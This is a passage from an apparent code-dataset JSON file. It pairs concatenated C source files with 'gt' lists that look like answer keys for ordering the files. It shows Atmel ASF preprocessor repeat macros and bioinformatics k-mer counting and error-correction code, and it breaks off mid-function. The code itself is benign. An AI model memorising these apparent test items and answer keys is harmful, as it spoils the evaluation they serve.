macro( 16, data)\n#define MREPEAT18( macro, data)       MREPEAT17( macro, data)   macro( 17, data)\n#define MREPEAT19( macro, data)       MREPEAT18( macro, data)   macro( 18, data)\n#define MREPEAT20( macro, data)       MREPEAT19( macro, data)   macro( 19, data)\n#define MREPEAT21( macro, data)       MREPEAT20( macro, data)   macro( 20, data)\n#define MREPEAT22( macro, data)       MREPEAT21( macro, data)   macro( 21, data)\n#define MREPEAT23( macro, data)       MREPEAT22( macro, data)   macro( 22, data)\n#define MREPEAT24( macro, data)       MREPEAT23( macro, data)   macro( 23, data)\n#define MREPEAT25( macro, data)       MREPEAT24( macro, data)   macro( 24, data)\n#define MREPEAT26( macro, data)       MREPEAT25( macro, data)   macro( 25, data)\n#define MREPEAT27( macro, data)       MREPEAT26( macro, data)   macro( 26, data)\n#define MREPEAT28( macro, data)       MREPEAT27( macro, data)   macro( 27, data)\n#define MREPEAT29( macro, data)       MREPEAT28( macro, data)   macro( 28, data)\n#define MREPEAT30( macro, data)       MREPEAT29( macro, data)   macro( 29, data)\n#define MREPEAT31( macro, data)       MREPEAT30( macro, data)   macro( 30, data)\n#define MREPEAT32( macro, data)       MREPEAT31( macro, data)   macro( 31, data)\n#define MREPEAT33( macro, data)       MREPEAT32( macro, data)   macro( 32, data)\n#define MREPEAT34( macro, data)       MREPEAT33( macro, data)   macro( 33, data)\n#define MREPEAT35( macro, data)       MREPEAT34( macro, data)   macro( 34, data)\n#define MREPEAT36( macro, data)       MREPEAT35( macro, data)   macro( 35, data)\n#define MREPEAT37( macro, data)       MREPEAT36( macro, data)   macro( 36, data)\n#define MREPEAT38( macro, data)       MREPEAT37( macro, data)   macro( 37, data)\n#define MREPEAT39( macro, data)       MREPEAT38( macro, data)   macro( 38, data)\n#define MREPEAT40( macro, data)       MREPEAT39( macro, data)   macro( 39, data)\n#define MREPEAT41( macro, data)       MREPEAT40( macro, data)   macro( 40, data)\n#define MREPEAT42( macro, data)       MREPEAT41( macro, data)   macro( 41, data)\n#define MREPEAT43( macro, data)       MREPEAT42( macro, data)   macro( 42, data)\n#define MREPEAT44( macro, data)       MREPEAT43( macro, data)   macro( 43, data)\n#define MREPEAT45( macro, data)       MREPEAT44( macro, data)   macro( 44, data)\n#define MREPEAT46( macro, data)       MREPEAT45( macro, data)   macro( 45, data)\n#define MREPEAT47( macro, data)       MREPEAT46( macro, data)   macro( 46, data)\n#define MREPEAT48( macro, data)       MREPEAT47( macro, data)   macro( 47, data)\n#define MREPEAT49( macro, data)       MREPEAT48( macro, data)   macro( 48, data)\n#define MREPEAT50( macro, data)       MREPEAT49( macro, data)   macro( 49, data)\n#define MREPEAT51( macro, data)       MREPEAT50( macro, data)   macro( 50, data)\n#define MREPEAT52( macro, data)       MREPEAT51( macro, data)   macro( 51, data)\n#define MREPEAT53( macro, data)       MREPEAT52( macro, data)   macro( 52, data)\n#define MREPEAT54( macro, data)       MREPEAT53( macro, data)   macro( 53, data)\n#define MREPEAT55( macro, data)       MREPEAT54( macro, data)   macro( 54, data)\n#define MREPEAT56( macro, data)       MREPEAT55( macro, data)   macro( 55, data)\n#define MREPEAT57( macro, data)       MREPEAT56( macro, data)   macro( 56, data)\n#define MREPEAT58( macro, data)       MREPEAT57( macro, data)   macro( 57, data)\n#define MREPEAT59( macro, data)       MREPEAT58( macro, data)   macro( 58, data)\n#define MREPEAT60( macro, data)       MREPEAT59( macro, data)   macro( 59, data)\n#define MREPEAT61( macro, data)       MREPEAT60( macro, data)   macro( 60, data)\n#define MREPEAT62( macro, data)       MREPEAT61( macro, data)   macro( 61, data)\n#define MREPEAT63( macro, data)       MREPEAT62( macro, data)   macro( 62, data)\n#define MREPEAT64( macro, data)       MREPEAT63( macro, data)   macro( 63, data)\n#define MREPEAT65( macro, data)       MREPEAT64( macro, data)   macro( 64, data)\n#define MREPEAT66( macro, data)       MREPEAT65( macro, data)   macro( 65, data)\n#define MREPEAT67( macro, data)       MREPEAT66( macro, data)   macro( 66, data)\n#define MREPEAT68( macro, data)       MREPEAT67( macro, data)   macro( 67, data)\n#define MREPEAT69( macro, data)       MREPEAT68( macro, data)   macro( 68, data)\n#define MREPEAT70( macro, data)       MREPEAT69( macro, data)   macro( 69, data)\n#define MREPEAT71( macro, data)       MREPEAT70( macro, data)   macro( 70, data)\n#define MREPEAT72( macro, data)       MREPEAT71( macro, data)   macro( 71, data)\n#define MREPEAT73( macro, data)       MREPEAT72( macro, data)   macro( 72, data)\n#define MREPEAT74( macro, data)       MREPEAT73( macro, data)   macro( 73, data)\n#define MREPEAT75( macro, data)       MREPEAT74( macro, data)   macro( 74, data)\n#define MREPEAT76( macro, data)       MREPEAT75( macro, data)   macro( 75, data)\n#define MREPEAT77( macro, data)       MREPEAT76( macro, data)   macro( 76, data)\n#define MREPEAT78( macro, data)       MREPEAT77( macro, data)   macro( 77, data)\n#define MREPEAT79( macro, data)       MREPEAT78( macro, data)   macro( 78, data)\n#define MREPEAT80( macro, data)       MREPEAT79( macro, data)   macro( 79, data)\n#define MREPEAT81( macro, data)       MREPEAT80( macro, data)   macro( 80, data)\n#define MREPEAT82( macro, data)       MREPEAT81( macro, data)   macro( 81, data)\n#define MREPEAT83( macro, data)       MREPEAT82( macro, data)   macro( 82, data)\n#define MREPEAT84( macro, data)       MREPEAT83( macro, data)   macro( 83, data)\n#define MREPEAT85( macro, data)       MREPEAT84( macro, data)   macro( 84, data)\n#define MREPEAT86( macro, data)       MREPEAT85( macro, data)   macro( 85, data)\n#define MREPEAT87( macro, data)       MREPEAT86( macro, data)   macro( 86, data)\n#define MREPEAT88( macro, data)       MREPEAT87( macro, data)   macro( 87, data)\n#define MREPEAT89( macro, data)       MREPEAT88( macro, data)   macro( 88, data)\n#define MREPEAT90( macro, data)       MREPEAT89( macro, data)   macro( 89, data)\n#define MREPEAT91( macro, data)       MREPEAT90( macro, data)   macro( 90, data)\n#define MREPEAT92( macro, data)       MREPEAT91( macro, data)   macro( 91, data)\n#define MREPEAT93( macro, data)       MREPEAT92( macro, data)   macro( 92, data)\n#define MREPEAT94( macro, data)       MREPEAT93( macro, data)   macro( 93, data)\n#define MREPEAT95( macro, data)       MREPEAT94( macro, data)   macro( 94, data)\n#define MREPEAT96( macro, data)       MREPEAT95( macro, data)   macro( 95, data)\n#define MREPEAT97( macro, data)       MREPEAT96( macro, data)   macro( 96, data)\n#define MREPEAT98( macro, data)       MREPEAT97( macro, data)   macro( 97, data)\n#define MREPEAT99( macro, data)       MREPEAT98( macro, data)   macro( 98, data)\n#define MREPEAT100(macro, data)       MREPEAT99( macro, data)   macro( 99, data)\n#define MREPEAT101(macro, data)       MREPEAT100(macro, data)   macro(100, data)\n#define MREPEAT102(macro, data)       MREPEAT101(macro, data)   macro(101, data)\n#define MREPEAT103(macro, data)       MREPEAT102(macro, data)   macro(102, data)\n#define MREPEAT104(macro, data)       MREPEAT103(macro, data)   macro(103, data)\n#define MREPEAT105(macro, data)       MREPEAT104(macro, data)   macro(104, data)\n#define MREPEAT106(macro, data)       MREPEAT105(macro, data)   macro(105, data)\n#define MREPEAT107(macro, data)       MREPEAT106(macro, data)   macro(106, data)\n#define MREPEAT108(macro, data)       MREPEAT107(macro, data)   macro(107, data)\n#define MREPEAT109(macro, data)       MREPEAT108(macro, data)   macro(108, data)\n#define MREPEAT110(macro, data)       MREPEAT109(macro, data)   macro(109, data)\n#define MREPEAT111(macro, data)       MREPEAT110(macro, data)   macro(110, data)\n#define MREPEAT112(macro, data)       MREPEAT111(macro, data)   macro(111, data)\n#define MREPEAT113(macro, data)       MREPEAT112(macro, data)   macro(112, data)\n#define MREPEAT114(macro, data)       MREPEAT113(macro, data)   macro(113, data)\n#define MREPEAT115(macro, data)       MREPEAT114(macro, data)   macro(114, data)\n#define MREPEAT116(macro, data)       MREPEAT115(macro, data)   macro(115, data)\n#define MREPEAT117(macro, data)       MREPEAT116(macro, data)   macro(116, data)\n#define MREPEAT118(macro, data)       MREPEAT117(macro, data)   macro(117, data)\n#define MREPEAT119(macro, data)       MREPEAT118(macro, data)   macro(118, data)\n#define MREPEAT120(macro, data)       MREPEAT119(macro, data)   macro(119, data)\n#define MREPEAT121(macro, data)       MREPEAT120(macro, data)   macro(120, data)\n#define MREPEAT122(macro, data)       MREPEAT121(macro, data)   macro(121, data)\n#define MREPEAT123(macro, data)       MREPEAT122(macro, data)   macro(122, data)\n#define MREPEAT124(macro, data)       MREPEAT123(macro, data)   macro(123, data)\n#define MREPEAT125(macro, data)       MREPEAT124(macro, data)   macro(124, data)\n#define MREPEAT126(macro, data)       MREPEAT125(macro, data)   macro(125, data)\n#define MREPEAT127(macro, data)       MREPEAT126(macro, data)   macro(126, data)\n#define MREPEAT128(macro, data)       MREPEAT127(macro, data)   macro(127, data)\n#define MREPEAT129(macro, data)       MREPEAT128(macro, data)   macro(128, data)\n#define MREPEAT130(macro, data)       MREPEAT129(macro, data)   macro(129, data)\n#define MREPEAT131(macro, data)       MREPEAT130(macro, data)   macro(130, data)\n#define MREPEAT132(macro, data)       MREPEAT131(macro, data)   macro(131, data)\n#define MREPEAT133(macro, data)       MREPEAT132(macro, data)   macro(132, data)\n#define MREPEAT134(macro, data)       MREPEAT133(macro, data)   macro(133, data)\n#define MREPEAT135(macro, data)       MREPEAT134(macro, data)   macro(134, data)\n#define MREPEAT136(macro, data)       MREPEAT135(macro, data)   macro(135, data)\n#define MREPEAT137(macro, data)       MREPEAT136(macro, data)   macro(136, data)\n#define MREPEAT138(macro, data)       MREPEAT137(macro, data)   macro(137, data)\n#define MREPEAT139(macro, data)       MREPEAT138(macro, data)   macro(138, data)\n#define MREPEAT140(macro, data)       MREPEAT139(macro, data)   macro(139, data)\n#define MREPEAT141(macro, data)       MREPEAT140(macro, data)   macro(140, data)\n#define MREPEAT142(macro, data)       MREPEAT141(macro, data)   macro(141, data)\n#define MREPEAT143(macro, data)       MREPEAT142(macro, data)   macro(142, data)\n#define MREPEAT144(macro, data)       MREPEAT143(macro, data)   macro(143, data)\n#define MREPEAT145(macro, data)       MREPEAT144(macro, data)   macro(144, data)\n#define MREPEAT146(macro, data)       MREPEAT145(macro, data)   macro(145, data)\n#define MREPEAT147(macro, data)       MREPEAT146(macro, data)   macro(146, data)\n#define MREPEAT148(macro, data)       MREPEAT147(macro, data)   macro(147, data)\n#define MREPEAT149(macro, data)       MREPEAT148(macro, data)   macro(148, data)\n#define MREPEAT150(macro, data)       MREPEAT149(macro, data)   macro(149, data)\n#define MREPEAT151(macro, data)       MREPEAT150(macro, data)   macro(150, data)\n#define MREPEAT152(macro, data)       MREPEAT151(macro, data)   macro(151, data)\n#define MREPEAT153(macro, data)       MREPEAT152(macro, data)   macro(152, data)\n#define MREPEAT154(macro, data)       MREPEAT153(macro, data)   macro(153, data)\n#define MREPEAT155(macro, data)       MREPEAT154(macro, data)   macro(154, data)\n#define MREPEAT156(macro, data)       MREPEAT155(macro, data)   macro(155, data)\n#define MREPEAT157(macro, data)       MREPEAT156(macro, data)   macro(156, data)\n#define MREPEAT158(macro, data)       MREPEAT157(macro, data)   macro(157, data)\n#define MREPEAT159(macro, data)       MREPEAT158(macro, data)   macro(158, data)\n#define MREPEAT160(macro, data)       MREPEAT159(macro, data)   macro(159, data)\n#define MREPEAT161(macro, data)       MREPEAT160(macro, data)   macro(160, data)\n#define MREPEAT162(macro, data)       MREPEAT161(macro, data)   macro(161, data)\n#define MREPEAT163(macro, data)       MREPEAT162(macro, data)   macro(162, data)\n#define MREPEAT164(macro, data)       MREPEAT163(macro, data)   macro(163, data)\n#define MREPEAT165(macro, data)       MREPEAT164(macro, data)   macro(164, data)\n#define MREPEAT166(macro, data)       MREPEAT165(macro, data)   macro(165, data)\n#define MREPEAT167(macro, data)       MREPEAT166(macro, data)   macro(166, data)\n#define MREPEAT168(macro, data)       MREPEAT167(macro, data)   macro(167, data)\n#define MREPEAT169(macro, data)       MREPEAT168(macro, data)   macro(168, data)\n#define MREPEAT170(macro, data)       MREPEAT169(macro, data)   macro(169, data)\n#define MREPEAT171(macro, data)       MREPEAT170(macro, data)   macro(170, data)\n#define MREPEAT172(macro, data)       MREPEAT171(macro, data)   macro(171, data)\n#define MREPEAT173(macro, data)       MREPEAT172(macro, data)   macro(172, data)\n#define MREPEAT174(macro, data)       MREPEAT173(macro, data)   macro(173, data)\n#define MREPEAT175(macro, data)       MREPEAT174(macro, data)   macro(174, data)\n#define MREPEAT176(macro, data)       MREPEAT175(macro, data)   macro(175, data)\n#define MREPEAT177(macro, data)       MREPEAT176(macro, data)   macro(176, data)\n#define MREPEAT178(macro, data)       MREPEAT177(macro, data)   macro(177, data)\n#define MREPEAT179(macro, data)       MREPEAT178(macro, data)   macro(178, data)\n#define MREPEAT180(macro, data)       MREPEAT179(macro, data)   macro(179, data)\n#define MREPEAT181(macro, data)       MREPEAT180(macro, data)   macro(180, data)\n#define MREPEAT182(macro, data)       MREPEAT181(macro, data)   macro(181, data)\n#define MREPEAT183(macro, data)       MREPEAT182(macro, data)   macro(182, data)\n#define MREPEAT184(macro, data)       MREPEAT183(macro, data)   macro(183, data)\n#define MREPEAT185(macro, data)       MREPEAT184(macro, data)   macro(184, data)\n#define MREPEAT186(macro, data)       MREPEAT185(macro, data)   macro(185, data)\n#define MREPEAT187(macro, data)       MREPEAT186(macro, data)   macro(186, data)\n#define MREPEAT188(macro, data)       MREPEAT187(macro, data)   macro(187, data)\n#define MREPEAT189(macro, data)       MREPEAT188(macro, data)   macro(188, data)\n#define MREPEAT190(macro, data)       MREPEAT189(macro, data)   macro(189, data)\n#define MREPEAT191(macro, data)       MREPEAT190(macro, data)   macro(190, data)\n#define MREPEAT192(macro, data)       MREPEAT191(macro, data)   macro(191, data)\n#define MREPEAT193(macro, data)       MREPEAT192(macro, data)   macro(192, data)\n#define MREPEAT194(macro, data)       MREPEAT193(macro, data)   macro(193, data)\n#define MREPEAT195(macro, data)       MREPEAT194(macro, data)   macro(194, data)\n#define MREPEAT196(macro, data)       MREPEAT195(macro, data)   macro(195, data)\n#define MREPEAT197(macro, data)       MREPEAT196(macro, data)   macro(196, data)\n#define MREPEAT198(macro, data)       MREPEAT197(macro, data)   macro(197, data)\n#define MREPEAT199(macro, data)       MREPEAT198(macro, data)   macro(198, data)\n#define MREPEAT200(macro, data)       MREPEAT199(macro, data)   macro(199, data)\n#define MREPEAT201(macro, data)       MREPEAT200(macro, data)   macro(200, data)\n#define MREPEAT202(macro, data)       MREPEAT201(macro, data)   macro(201, data)\n#define MREPEAT203(macro, data)       MREPEAT202(macro, data)   macro(202, data)\n#define MREPEAT204(macro, data)       MREPEAT203(macro, data)   macro(203, data)\n#define MREPEAT205(macro, data)       MREPEAT204(macro, data)   macro(204, data)\n#define MREPEAT206(macro, data)       MREPEAT205(macro, data)   macro(205, data)\n#define MREPEAT207(macro, data)       MREPEAT206(macro, data)   macro(206, data)\n#define MREPEAT208(macro, data)       MREPEAT207(macro, data)   macro(207, data)\n#define MREPEAT209(macro, data)       MREPEAT208(macro, data)   macro(208, data)\n#define MREPEAT210(macro, data)       MREPEAT209(macro, data)   macro(209, data)\n#define MREPEAT211(macro, data)       MREPEAT210(macro, data)   macro(210, data)\n#define MREPEAT212(macro, data)       MREPEAT211(macro, data)   macro(211, data)\n#define MREPEAT213(macro, data)       MREPEAT212(macro, data)   macro(212, data)\n#define MREPEAT214(macro, data)       MREPEAT213(macro, data)   macro(213, data)\n#define MREPEAT215(macro, data)       MREPEAT214(macro, data)   macro(214, data)\n#define MREPEAT216(macro, data)       MREPEAT215(macro, data)   macro(215, data)\n#define MREPEAT217(macro, data)       MREPEAT216(macro, data)   macro(216, data)\n#define MREPEAT218(macro, data)       MREPEAT217(macro, data)   macro(217, data)\n#define MREPEAT219(macro, data)       MREPEAT218(macro, data)   macro(218, data)\n#define MREPEAT220(macro, data)       MREPEAT219(macro, data)   macro(219, data)\n#define MREPEAT221(macro, data)       MREPEAT220(macro, data)   macro(220, data)\n#define MREPEAT222(macro, data)       MREPEAT221(macro, data)   macro(221, data)\n#define MREPEAT223(macro, data)       MREPEAT222(macro, data)   macro(222, data)\n#define MREPEAT224(macro, data)       MREPEAT223(macro, data)   macro(223, data)\n#define MREPEAT225(macro, data)       MREPEAT224(macro, data)   macro(224, data)\n#define MREPEAT226(macro, data)       MREPEAT225(macro, data)   macro(225, data)\n#define MREPEAT227(macro, data)       MREPEAT226(macro, data)   macro(226, data)\n#define MREPEAT228(macro, data)       MREPEAT227(macro, data)   macro(227, data)\n#define MREPEAT229(macro, data)       MREPEAT228(macro, data)   macro(228, data)\n#define MREPEAT230(macro, data)       MREPEAT229(macro, data)   macro(229, data)\n#define MREPEAT231(macro, data)       MREPEAT230(macro, data)   macro(230, data)\n#define MREPEAT232(macro, data)       MREPEAT231(macro, data)   macro(231, data)\n#define MREPEAT233(macro, data)       MREPEAT232(macro, data)   macro(232, data)\n#define MREPEAT234(macro, data)       MREPEAT233(macro, data)   macro(233, data)\n#define MREPEAT235(macro, data)       MREPEAT234(macro, data)   macro(234, data)\n#define MREPEAT236(macro, data)       MREPEAT235(macro, data)   macro(235, data)\n#define MREPEAT237(macro, data)       MREPEAT236(macro, data)   macro(236, data)\n#define MREPEAT238(macro, data)       MREPEAT237(macro, data)   macro(237, data)\n#define MREPEAT239(macro, data)       MREPEAT238(macro, data)   macro(238, data)\n#define MREPEAT240(macro, data)       MREPEAT239(macro, data)   macro(239, data)\n#define MREPEAT241(macro, data)       MREPEAT240(macro, data)   macro(240, data)\n#define MREPEAT242(macro, data)       MREPEAT241(macro, data)   macro(241, data)\n#define MREPEAT243(macro, data)       MREPEAT242(macro, data)   macro(242, data)\n#define MREPEAT244(macro, data)       MREPEAT243(macro, data)   macro(243, data)\n#define MREPEAT245(macro, data)       MREPEAT244(macro, data)   macro(244, data)\n#define MREPEAT246(macro, data)       MREPEAT245(macro, data)   macro(245, data)\n#define MREPEAT247(macro, data)       MREPEAT246(macro, data)   macro(246, data)\n#define MREPEAT248(macro, data)       MREPEAT247(macro, data)   macro(247, data)\n#define MREPEAT249(macro, data)       MREPEAT248(macro, data)   macro(248, data)\n#define MREPEAT250(macro, data)       MREPEAT249(macro, data)   macro(249, data)\n#define MREPEAT251(macro, data)       MREPEAT250(macro, data)   macro(250, data)\n#define MREPEAT252(macro, data)       MREPEAT251(macro, data)   macro(251, data)\n#define MREPEAT253(macro, data)       MREPEAT252(macro, data)   macro(252, data)\n#define MREPEAT254(macro, data)       MREPEAT253(macro, data)   macro(253, data)\n#define MREPEAT255(macro, data)       MREPEAT254(macro, data)   macro(254, data)\n#define MREPEAT256(macro, data)       MREPEAT255(macro, data)   macro(255, data)\n\n\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/tpaste.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/preprocessor.h'",
            "'EasyAVR/firmware/src/ASF/mega/utils/preprocessor/mrepeat.h'"
        ]
    },
    {
        "files": [
            "'bio-playground/nim-stuffs/fermil-nim/fml.h'",
            "'bio-playground/nim-stuffs/fermil-nim/internal.h'",
            "'bio-playground/nim-stuffs/fermil-nim/bfc.c'"
        ],
        "content": "'bio-playground/nim-stuffs/fermil-nim/fml.h'\n:#ifndef FML_H\n#define FML_H\n\n#define FML_VERSION \"r53\"\n\n#include <stdint.h>\n\ntypedef struct {\n\tint32_t l_seq;\n\tchar *seq, *qual;\n} bseq1_t;\n\n#define MAG_F_AGGRESSIVE 0x20\n#define MAG_F_POPOPEN    0x40\n#define MAG_F_NO_SIMPL   0x80\n\ntypedef struct {\n\tint flag, min_ovlp, min_elen, min_ensr, min_insr, max_bdist, max_bdiff, max_bvtx, min_merge_len, trim_len, trim_depth;\n\tfloat min_dratio1, max_bcov, max_bfrac;\n} magopt_t;\n\ntypedef struct {\n\tint n_threads;\n\tint ec_k;\n\tint min_cnt, max_cnt;\n\tint min_asm_ovlp;\n\tint min_merge_len;\n\tmagopt_t mag_opt;\n} fml_opt_t;\n\nstruct rld_t;\nstruct mag_t;\n\ntypedef struct {\n\tuint32_t len:31, from:1;\n\tuint32_t id:31, to:1;\n} fml_ovlp_t;\n\ntypedef struct {\n\tint32_t len;\n\tint32_t nsr;\n\tchar *seq;\n\tchar *cov;\n\tint n_ovlp[2];\n\tfml_ovlp_t *ovlp;\n} fml_utg_t;\n\nextern int fm_verbose;\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\nbseq1_t *bseq_read(const char *fn, int *n);\n\n\nvoid fml_opt_init(fml_opt_t *opt);\n\n\nfml_utg_t *fml_assemble(const fml_opt_t *opt, int n_seqs, bseq1_t *seqs, int *n_utg);\n\n\nvoid fml_utg_destroy(int n_utg, fml_utg_t *utg);\n\n\n\n\nvoid fml_opt_adjust(fml_opt_t *opt, int n_seqs, const bseq1_t *seqs);\n\n\nfloat fml_correct(const fml_opt_t *opt, int n, bseq1_t *seq);\nfloat fml_fltuniq(const fml_opt_t *opt, int n, bseq1_t *seq);\n\n\nstruct rld_t *fml_seq2fmi(const fml_opt_t *opt, int n, bseq1_t *seq);\n\n\nstruct mag_t *fml_fmi2mag(const fml_opt_t *opt, struct rld_t *e);\n\n\nvoid fml_mag_clean(const fml_opt_t *opt, struct mag_t *g);\n\n\nfml_utg_t *fml_mag2utg(struct mag_t *g, int *n_utg);\n\n\nvoid fml_utg_print(int n_utgs, const fml_utg_t *utg);\n\n\nvoid fml_utg_print_gfa(int n, const fml_utg_t *utg);\n\n\nvoid fml_fmi_destroy(struct rld_t *e);\n\n\nvoid fml_mag_destroy(struct mag_t *g);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'bio-playground/nim-stuffs/fermil-nim/internal.h'\n:#ifndef FML_INTERNAL_H\n#define FML_INTERNAL_H\n\n#include \"fml.h\"\n\nextern unsigned char seq_nt6_table[256];\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nvoid kt_for(int n_threads, void (*func)(void*,long,int), void *data, long n);\nvoid seq_reverse(int l, unsigned char *s);\nvoid seq_revcomp6(int l, unsigned char *s);\nstruct bfc_ch_s *fml_count(int n, const bseq1_t *seq, int k, int q, int l_pre, int n_threads);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'bio-playground/nim-stuffs/fermil-nim/bfc.c'\n:#include <stdlib.h>\n#include <string.h>\n#include <assert.h>\n#include <limits.h>\n#include <stdio.h>\n#include \"htab.h\"\n#include \"kmer.h\"\n#include \"internal.h\"\n#include \"fml.h\"\n\n\n\ntypedef struct {\n\tint n_threads, q, k, l_pre;\n\tint min_cov;\n\n\tint max_end_ext;\n\tint win_multi_ec;\n\tfloat min_trim_frac;\n\n\n\tint w_ec, w_ec_high, w_absent, w_absent_high;\n\tint max_path_diff, max_heap;\n} bfc_opt_t;\n\nvoid bfc_opt_init(bfc_opt_t *opt)\n{\n\tmemset(opt, 0, sizeof(bfc_opt_t));\n\topt->n_threads = 1;\n\topt->q = 20;\n\topt->k = -1;\n\topt->l_pre = -1;\n\n\topt->min_cov = 4;\n\topt->win_multi_ec = 10;\n\topt->max_end_ext = 5;\n\topt->min_trim_frac = .8;\n\n\topt->w_ec = 1;\n\topt->w_ec_high = 7;\n\topt->w_absent = 3;\n\topt->w_absent_high = 1;\n\topt->max_path_diff = 15;\n\topt->max_heap = 100;\n}\n\n\n\n#define CNT_BUF_SIZE 256\n\ntypedef struct {\n\tuint64_t y[2];\n\tint is_high;\n} insbuf_t;\n\ntypedef struct {\n\tint k, q;\n\tint n_seqs;\n\tconst bseq1_t *seqs;\n\tbfc_ch_t *ch;\n\tint *n_buf;\n\tinsbuf_t **buf;\n} cnt_step_t;\n\nbfc_kmer_t bfc_kmer_null = {{0,0,0,0}};\n\nstatic int bfc_kmer_bufclear(cnt_step_t *cs, int forced, int tid)\n{\n\tint i, k, r;\n\tif (cs->ch == 0) return 0;\n\tfor (i = k = 0; i < cs->n_buf[tid]; ++i) {\n\t\tr = bfc_ch_insert(cs->ch, cs->buf[tid][i].y, cs->buf[tid][i].is_high, forced);\n\t\tif (r < 0) cs->buf[tid][k++] = cs->buf[tid][i];\n\t}\n\tcs->n_buf[tid] = k;\n\treturn k;\n}\n\nstatic void bfc_kmer_insert(cnt_step_t *cs, const bfc_kmer_t *x, int is_high, int tid)\n{\n\tint k = cs->k;\n\tuint64_t y[2], hash;\n\thash = bfc_kmer_hash(k, x->x, y);\n\tif (bfc_ch_insert(cs->ch, y, is_high, 0) < 0) {\n\t\tinsbuf_t *p;\n\t\tif (bfc_kmer_bufclear(cs, 0, tid) == CNT_BUF_SIZE)\n\t\t\tbfc_kmer_bufclear(cs, 1, tid);\n\t\tp = &cs->buf[tid][cs->n_buf[tid]++];\n\t\tp->y[0] = y[0], p->y[1] = y[1], p->is_high = is_high;\n\t}\n}\n\nstatic void worker_count(void *_data, long k, int tid)\n{\n\tcnt_step_t *cs = (cnt_step_t*)_data;\n\tconst bseq1_t *s = &cs->seqs[k];\n\tint i, l;\n\tbfc_kmer_t x = bfc_kmer_null;\n\tuint64_t qmer = 0, mask = (1ULL<<cs->k) - 1;\n\tfor (i = l = 0; i < s->l_seq; ++i) {\n\t\tint c = seq_nt6_table[(uint8_t)s->seq[i]] - 1;\n\t\tif (c < 4) {\n\t\t\tbfc_kmer_append(cs->k, x.x, c);\n\t\t\tqmer = (qmer<<1 | (s->qual == 0 || s->qual[i] - 33 >= cs->q)) & mask;\n\t\t\tif (++l >= cs->k) bfc_kmer_insert(cs, &x, (qmer == mask), tid);\n\t\t} else l = 0, qmer = 0, x = bfc_kmer_null;\n\t}\n}\n\nstruct bfc_ch_s *fml_count(int n, const bseq1_t *seq, int k, int q, int l_pre, int n_threads)\n{\n\tint i;\n\tcnt_step_t cs;\n\tcs.n_seqs = n, cs.seqs = seq, cs.k = k, cs.q = q;\n\tcs.ch = bfc_ch_init(cs.k, l_pre);\n\tcs.n_buf = calloc(n_threads, sizeof(int));\n\tcs.buf = calloc(n_threads, sizeof(void*));\n\tfor (i = 0; i < n_threads; ++i)\n\t\tcs.buf[i] = malloc(CNT_BUF_SIZE * sizeof(insbuf_t));\n\tkt_for(n_threads, worker_count, &cs, cs.n_seqs);\n\tfor (i = 0; i < n_threads; ++i) free(cs.buf[i]);\n\tfree(cs.buf); free(cs.n_buf);\n\treturn cs.ch;\n}\n\n\n\n#define BFC_MAX_KMER     63\n#define BFC_MAX_BF_SHIFT 37\n\n#define BFC_MAX_PATHS 4\n#define BFC_EC_HIST 5\n#define BFC_EC_HIST_HIGH 2\n\n#define BFC_EC_MIN_COV_COEF .1\n\n\n\n#include \"kvec.h\"\n\ntypedef struct {\n\tuint8_t b:3, q:1, ob:3, oq:1;\n\tuint8_t dummy;\n\tuint16_t lcov:6, hcov:6, solid_end:1, high_end:1, ec:1, absent:1;\n\tint i;\n} ecbase_t;\n\ntypedef kvec_t(ecbase_t) ecseq_t;\n\nstatic int bfc_seq_conv(const char *s, const char *q, int qthres, ecseq_t *seq)\n{\n\tint i, l;\n\tl = strlen(s);\n\tkv_resize(ecbase_t, *seq, l);\n\tseq->n = l;\n\tfor (i = 0; i < l; ++i) {\n\t\tecbase_t *c = &seq->a[i];\n\t\tc->b = c->ob = seq_nt6_table[(int)s[i]] - 1;\n\t\tc->q = c->oq = !q? 1 : q[i] - 33 >= qthres? 1 : 0;\n\t\tif (c->b > 3) c->q = c->oq = 0;\n\t\tc->i = i;\n\t}\n\treturn l;\n}\n\nstatic inline ecbase_t ecbase_comp(const ecbase_t *b)\n{\n\tecbase_t r = *b;\n\tr.b = b->b < 4? 3 - b->b : 4;\n\tr.ob = b->ob < 4? 3 - b->ob : 4;\n\treturn r;\n}\n\nstatic void bfc_seq_revcomp(ecseq_t *seq)\n{\n\tint i;\n\tfor (i = 0; i < seq->n>>1; ++i) {\n\t\tecbase_t tmp;\n\t\ttmp = ecbase_comp(&seq->a[i]);\n\t\tseq->a[i] = ecbase_comp(&seq->a[seq->n - 1 - i]);\n\t\tseq->a[seq->n - 1 - i] = tmp;\n\t}\n\tif (seq->n&1) seq->a[i] = ecbase_comp(&seq->a[i]);\n}\n\n\n\nint bfc_ec_greedy_k(int k, int mode, const bfc_kmer_t *x, const bfc_ch_t *ch)\n{\n\tint i, j, max = 0, max_ec = -1, max2 = 0;\n\tfor (i = 0; i < k; ++i) {\n\t\tint c = (x->x[1]>>i&1)<<1 | (x->x[0]>>i&1);\n\t\tfor (j = 0; j < 4; ++j) {\n\t\t\tbfc_kmer_t y = *x;\n\t\t\tint ret;\n\t\t\tif (j == c) continue;\n\t\t\tbfc_kmer_change(k, y.x, i, j);\n\t\t\tret = bfc_ch_kmer_occ(ch, &y);\n\t\t\tif (ret < 0) continue;\n\t\t\tif ((max&0xff) < (ret&0xff)) max2 = max, max = ret, max_ec = i<<2 | j;\n\t\t\telse if ((max2&0xff) < (ret&0xff)) max2 = ret;\n\t\t}\n\t}\n\treturn (max&0xff) * 3 > mode && (max2&0xff) < 3? max_ec : -1;\n}\n\nint bfc_ec_first_kmer(int k, const ecseq_t *s, int start, bfc_kmer_t *x)\n{\n\tint i, l;\n\t*x = bfc_kmer_null;\n\tfor (i = start, l = 0; i < s->n; ++i) {\n\t\tecbase_t *c = &s->a[i];\n\t\tif (c->b < 4) {\n\t\t\tbfc_kmer_append(k, x->x, c->b);\n\t\t\tif (++l == k) break;\n\t\t} else l = 0, *x = bfc_kmer_null;\n\t}\n\treturn i;\n}\n\nvoid bfc_ec_kcov(int k, int min_occ, ecseq_t *s, const bfc_ch_t *ch)\n{\n\tint i, l, r, j;\n\tbfc_kmer_t x = bfc_kmer_null;\n\tfor (i = l = 0; i < s->n; ++i) {\n\t\tecbase_t *c = 